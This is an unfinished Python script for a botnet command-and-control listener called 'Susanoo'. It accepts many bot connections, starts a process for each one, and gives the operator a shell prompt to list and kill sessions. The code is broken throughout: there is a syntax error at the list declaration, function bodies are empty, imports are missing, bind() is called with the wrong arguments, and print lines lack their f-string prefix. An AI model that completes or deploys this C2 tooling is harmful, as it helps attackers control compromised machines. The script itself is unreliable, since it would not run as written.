#!/usr/bin/python

import socket
import sys
import os
import multiprocessing as mp
import threading
import queue

q = queue.Queue()
process_list[]

def clientExecuter(client,client_addr,q):
    # Write code to actually send the data to client and recieve to response and save it in a dict

def handlerExecuter(cmd):
    global process_list
    
    if(cmd[:4]=="kill"):
        proc_name = cmd[5:]
        flag = 0
        for proc in process_list:
            if(proc.name == proc_name):
                proc.join()
                print("[+] Process {proc_name} is terminated\n")
                flag = 1
                break
        if(flag == 0):
            print("[-] Process not found\n")
    elif(cmd == "list"):
        


def handlerCmdShell(q):
    global process_list
    while(True):
        handler_cmd = str(input("Susanoo> "))
        if(handler_cmd == ""):
            pass
        elif(handler_cmd == "exit"):
            for proc in process_list:
                time.sleep(0.1)
                proc.join()
            time.sleep(5)
            os._exit(0)
            # Close all the process one by one and exit the program after that
        else:
            handlerExecuter(handler_cmd)




def listener(lhost,lport,q):
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(lhost,lport)
    sock.listen(100)
    # Started the listener which can handle 100 connections.
    print ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
        
    handler_cmd_thread = threading.Thread(target=handlerCmdShell,args=(q,))
    handler_cmd_thread.start()
    # Handler cmd shell started here.
    # It is running as serperate thread to give us an free cmd shell while listener runs in background.

    while(True):
        global process_list
        (client,client_addr) = sock.accept()
        new_process = Process(target=clientExecuter,args=(client,client_addr,q))
        process_list.append(new_process)
        new_process.start()
        # Created new process for every connection that I get and save the process in process_list 




def main():
    if(len(sys.argv) < 3):
        print("[!] Useage:\n[+] python {sys.argv[0]} LHOST LPORT\n")
    else:
        try:
            lhost = sys.argv[1]
            lport = sys.argv[2]
            listener(lhost,lport,q)

        except:
            ex = str(Exception)
            print("\n[-] Unable to start a handler. Reason: {ex}\n")
            # exit(0)





if __name__ == '__main__':
    main()